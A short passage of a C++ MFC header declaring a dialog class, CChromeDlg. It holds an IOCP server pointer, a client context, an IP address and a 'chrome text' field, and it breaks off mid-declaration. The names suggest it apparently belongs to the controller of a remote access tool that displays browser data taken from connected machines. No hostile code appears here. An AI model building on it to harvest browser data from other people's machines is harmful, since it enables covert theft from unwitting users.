...
#pragma once
#endif // _MSC_VER > 1000
// ChromeDlg.h : header file
//

/////////////////////////////////////////////////////////////////////////////
// CChromeDlg dialog

class CChromeDlg : public CDialog
{
// Construction
public:
	CChromeDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext);   // standard constructor
	ClientContext* m_pContext;
	CIOCPServer* m_iocpServer;
	CString m_IPAddress;
	CString m_chrome_text;
// Dialog Data
	//{{AFX_DATA(CChromeDlg)
	enum { IDD = IDD_DIALOG_CHROME };
